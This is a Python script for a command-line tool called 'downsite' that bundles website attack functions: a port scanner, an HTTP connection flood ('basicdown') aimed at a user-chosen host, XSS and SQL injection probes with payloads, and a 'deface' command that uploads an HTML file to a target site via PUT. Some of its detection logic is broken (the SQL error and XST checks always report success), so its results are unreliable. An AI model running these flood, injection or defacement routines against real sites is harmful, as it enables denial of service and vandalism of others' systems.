import requests
import urllib
import os
import socket
import sys
import time
try:
	from selenium import webdriver
except ImportError:
	os.system("pip install selenium")
try:
	from bs4 import BeautifulSoup
except ImportError:
	os.system("pip install BeautifulSoup")

version = "1.1.0"

def clear():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")

#--- portscan ---#

def scanHost(ip, startPort, endPort):
	print(f"starting TCP port scan on host '{ip}'\n")
	tcp_scan(ip, startPort, endPort)
	print(f"TCP scan on host '{ip}' completed")

def scanRange(network, startPort, endPort):
	print(f"starting TCP port scan on network '{network}'\n")
	for host in range(1, 255):
		ip = network + "." + str(host)
		tcp_scan(ip, startPort, endPort)
	print(f"TCP scan on network '{network}' completed")

def tcp_scan(ip, startPort, endPort):
	for port in range(startPort, endPort + 1):
		try:
			tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			if not tcp.connect_ex((ip, port)):
				print(f"{ip}:{port}/TCP open")
				tcp.close()
		except Exception:
			pass

#--- portscan ---#

#--- dos ---#

user_agents = (
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
	"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
)

def dos():
	host = input("host to attack: ")
	ip = socket.gethostbyname(host)
	print("ip of the host: " + ip)
	conn = input("packets to send (2000-3000 for average): ")
	conn = int(conn)

	for i in range(conn):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		except:
			print("unable to create socket. retrying.")
			continue
		try:
			s.connect((ip, 80))
		except:
			print("connection failed. retrying.")
			continue
		print("flooding..")
		s.send("GET / HTTP/1.1\r\n".encode())
		s.send("Host: ".encode()+host.encode()+"\r\n".encode())
		s.send("User-Agent: ".encode() + choice(user_agents).encode()+"\r\n\r\n".encode())
		s.close()
		print("flooded")

#--- dos ---#

#--- xss ---#

def xss():
	url = input("website url: ")
	paydone = []
	payloads = ['injectest','/inject','//inject//','<inject','(inject','"inject','<script>alert("inject")</script>']
	print("testing xss vulnerabilities with 10 payloads..")

	urlt = url.split("=")
	urlt = urlt[0] + '='
	for pl in payloads:
		urlte = urlt + pl
		re = requests.get(urlte).text
		if pl in re:
			paydone.append(pl)
		else:
			pass
	url1 = urlt + '%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb'
	req1 = requests.get(url1).text
	if "'>inject<svg/onload=confirm(/inject/)>web" in req1:
		paydone.append('%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb')
	else:
		pass

	url2 = urlt + '%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
	req2 = requests.get(url2).text
	if '<script>alert("inject")</script>' in req2:
		paydone.append('%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
	else:
		pass

	url3 = urlt + '%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
	req3 = requests.get(url3).text
	if '<script>alert("inject")</script>' in req3:
		paydone.append('%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
	else:
		pass

	if len(paydone) == 0:
		print("was not possible to exploit vulnerabilities using XSS.")
	else:
		print(len(paydone)," XSS payloads were found.")
		for p in paydone:
			print("\npayload found")
			print("- payload:",p)
			print("- POC:",urlt+p)

#--- xss ---#

#--- sql ---#

def sql():
	url = input("website url: ")
	print("testing SQLi..")
	urlt = url.split("=")
	urlt = urlt[0] + '='
	urlb = urlt + '1-SLEEP(2)'

	time1 = time.time()
	req = requests.get(urlb)
	time2 = time.time()
	timet = time2 - time1
	timet = str(timet)
	timet = timet.split(".")
	timet = timet[0]
	if int(timet) >= 2:
		print("blind SQL injection time based found")
		print("payload:",'1-SLEEP(2)')
		print("POC:",urlb)
	else:
		print("SQL time based failed")


	payload1 = "'"
	urlq = urlt + payload1
	reqqq = requests.get(urlq).text
	if 'mysql_fetch_array()' or 'You have an error in your SQL syntax' or 'error in your SQL syntax' \
			or 'mysql_numrows()' or 'Input String was not in a correct format' or 'mysql_fetch' \
			or 'num_rows' or 'Error Executing Database Query' or 'Unclosed quotation mark' \
			or 'Error Occured While Processing Request' or 'Server Error' or 'Microsoft OLE DB Provider for ODBC Drivers Error' \
			or 'Invalid Querystring' or 'VBScript Runtime' or 'Syntax Error' or 'GetArray()' or 'FetchRows()' in reqqq:
		print("\nSQL error found")
		print("payload:",payload1)
		print("POC:",urlq)
	else:
		pass

#--- sql ---#

#--- xst ---#

def xst():
	url = input("website url: ")
	print("testing XST")
	headers = {"Test":"Hello_World"}
	req = requests.get(url, headers=headers)
	head = req.headers
	if "Test" or "test" in head:
		print("website seems vulnerable to cross site tracing (XST)")
	else:
		print("XST failed")

#--- xst ---#

#--- deface ---#

def deface():
	target = input("website url: ")
	script = input("html file: ")
	payload = open(script, "r").read()
	s = requests.Session()
	print("uploading file to website..")
	try:
		if target.startswith("http://") is False:
			target = "http://" + target
		req = s.put(target + "/" + script, data=payload)
		if req.status_code < 200 or req.status_code >= 250:
			print("defacing failed")
		else:
			print("successfully defaced")

	except requests.exceptions.RequestException:
		pass

#--- deface ---#

clear()
print(f"hello, user. OS: {os.name} / version: {version}")

def main():
	try:
		terminal = input("\n$downsite> ")

		if terminal == "help":
			print("""
		help > shows this message
		about > information about downsite
		cls > clears the terminal
		args > check specific command arguments
		check > check website status
		scan > scans ports of a domain
		getip > gets ip of a website
		basicdown > downs a website using basic knowledge
		xss > searches XSS vulnerabilities on a website
		sql > searches SQLi vulnerabilities on a website
		xst > searches XST vulnerabilities on a website
		deface > defaces a website
		steal > steals html, css and js from a website
		headers > gets headers from a website
		favicon > downloads favicon of a website
		""")

		elif terminal == "args":
			print("args arguments: <command>")

		elif terminal == "args help":
			print("help arguments: no arguments needed")

		elif terminal == "args args":
			print("args arguments: <command>")

		elif terminal == "args check":
			print("check arguments: no arguments needed")

		elif terminal == "check":
			twebsite = input("website url: ")
			if twebsite.startswith("https://") == False:
				website = "https://" + twebsite
			else:
				website = twebsite
			code = urllib.request.urlopen(website).getcode()
			if code == int("200"):
				print(f"website is up. code: {code}")
			elif code == int("404"):
				print(f"website not found. code: {code}")
			elif code == int("403"):
				print(f"access forbidden. code: {code}")
			elif code == int("522"):
				print(f"connection timed out. code: {code}")

		elif terminal == "scan":
			socket.setdefaulttimeout(0.01)
			network = input("ip: ")
			startPort = int(input("start port: "))
			endPort = int(input("end port: "))
			scanHost(network, startPort, endPort)

		elif terminal == "basicdown":
			dos()

		elif terminal == "getip":
			website = input("website url: ")
			ip = socket.gethostbyname(website)
			print(f"ip found: {ip}")

		elif terminal == "xss":
			xss()

		elif terminal == "sql":
			sql()

		elif terminal == "xst":
			xst()

		elif terminal == "deface":
			deface()

		elif terminal == "about":
			print("\ndownsite is made by waw for educational purposes only. designed to be strong, fast and efficient, downsite will contain a large array of pen-testing tools.\nmade with love, 2023, waw.")

		elif terminal == "cls":
			clear()
			print(f"hello, user. OS: {os.name} / version: {version}")

		elif terminal == "steal":
			website = input("website url: ")
			response = requests.get(website)
			if response.status_code == 200:
				soup = BeautifulSoup(response.content, "html.parser")
				with open("index.html", "w") as html_file:
					html_file.write(str(soup))

				css_files = [link["href"] for link in soup.find_all("link") if link.get("rel")[0] == "stylesheet"]
				js_files = [script["src"] for script in soup.find_all("script") if script.get("src")]

				for css_file in css_files:
					css_response = requests.get(css_file)
					with open(css_file.split("/")[-1], "w") as css_file:
						css_file.write(css_response.text)

				for js_file in js_files:
					js_response = requests.get(js_file)
					with open(js_file.split("/")[-1], "w") as js_file:
						js_file.write(js_response.text)
			else:
				print("failed to retrieve website content")

		elif terminal == "headers":
			website = input("website url: ")
			response = requests.get(website)
			print("headers:")
			for header, value in response.headers.items():
				print(f"{header}: {value}")

		elif terminal == "favicon":
			website = input("website url: ")
			favname = input("image name: ")
			if favname == None:
				favname = "favicon"
			response = requests.get(website, stream=True)
			if response.status_code == 200:
				with open(f"{favname}.ico", "wb") as f:
					favicon_url = website + "/favicon.ico"
					favicon = requests.get(favicon_url, stream=True).content
					f.write(favicon)
					print(f"favicon saved as {favname}.ico")
			else:
				print("favicon not found")

		else:
			print("command not found")

	except Exception as e:
		print(e)

if __name__ == '__main__':
	while True:
		main()